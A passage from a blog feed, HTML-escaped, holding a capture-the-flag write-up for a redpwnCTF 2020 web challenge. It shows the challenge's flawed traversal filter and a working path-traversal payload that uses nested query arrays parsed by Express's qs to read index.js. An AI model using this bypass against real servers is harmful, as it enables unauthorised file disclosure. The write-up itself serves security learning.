+&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;&lt;div &gt;
+    &lt;script src=&quot;https:&amp;#x2F;&amp;#x2F;gist.github.com&amp;#x2F;srikavin&amp;#x2F;88989ab1c98ab52f94c86593e3d30b5a.js&quot;&gt;&lt;&#x2F;script&gt;
+&lt;&#x2F;div&gt;
+&lt;h1 id=&quot;local-file-inclusion&quot;&gt;Local File Inclusion&lt;&#x2F;h1&gt;
+&lt;p&gt;When we open the site we&#x27;re greeted by a wonderfully-designed site. The URL also includes a path parameter: &lt;code&gt;https:&#x2F;&#x2F;tux-fanpage.2020.redpwnc.tf&#x2F;page?path=index.html&lt;&#x2F;code&gt;. Looking at the source code shows us that the path is used to load a file from the file system after a series of checks:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;Prevent directory traversal attack
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;preventTraversal&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(dir){
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(dir.includes(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;..&#x2F;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)){
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;res &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;dir.replace(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;..&#x2F;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;preventTraversal(res)
+    }
+
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;In case people want to test locally on windows
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(dir.includes(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;..&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)){
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;let &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;res &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;dir.replace(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;..&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;preventTraversal(res)
+    }
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;dir
+}
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;Get absolute path from relative path
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;prepare&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(dir){
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;path.resolve(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;.&#x2F;public&#x2F;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;dir)
+}
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;Strip leading characters
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;strip&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(dir){
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;regex &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;[a-z0-9]&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;im
+
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;Remove first character if not alphanumeric
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;regex.test(dir[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;])){
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(dir.length &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;){
+            &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;strip(dir.slice(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;))
+        }
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&amp;#39;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;}
+
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;dir
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;There&#x27;s no clear way to bypass these checks. &lt;&#x2F;p&gt;
+&lt;h2 id=&quot;express-js-query-parsing&quot;&gt;Express.js Query Parsing&lt;&#x2F;h2&gt;
+&lt;p&gt;Express, &lt;a href=&quot;https:&#x2F;&#x2F;expressjs.com&#x2F;en&#x2F;api.html#app.settings.table&quot;&gt;by default&lt;&#x2F;a&gt;, uses the npm package &lt;a href=&quot;https:&#x2F;&#x2F;www.npmjs.com&#x2F;package&#x2F;qs&quot;&gt;&lt;code&gt;qs&lt;&#x2F;code&gt;&lt;&#x2F;a&gt; to decode query parameters. &lt;&#x2F;p&gt;
+&lt;p&gt;qs can parse certain query parameters into strings and objects. However, the parameters we choose need to pass the validation. Using an object fails when reaching &lt;code&gt;preventTraversal&lt;&#x2F;code&gt; because &lt;code&gt;includes&lt;&#x2F;code&gt; is not a function on objects. Using an array works, but &lt;code&gt;..&#x2F;&lt;&#x2F;code&gt; is still removed from the array in &lt;code&gt;preventTraversal&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;nested-arrays&quot;&gt;Nested Arrays&lt;&#x2F;h3&gt;
+&lt;p&gt;Using a nested array bypasses the &#x27;includes&lt;code&gt;check because a string cannot equal an array (even in Javascript). This leads to the final solution:&lt;&#x2F;code&gt;https:&#x2F;&#x2F;tux-fanpage.2020.redpwnc.tf&#x2F;page?path[0]=a&amp;amp;path[1][1]=..&#x2F;..&#x2F;..&#x2F;index.js`, and we find the flag:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;flag{tr4v3rsal_Tim3}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+</content>
+	</entry>
+</feed>
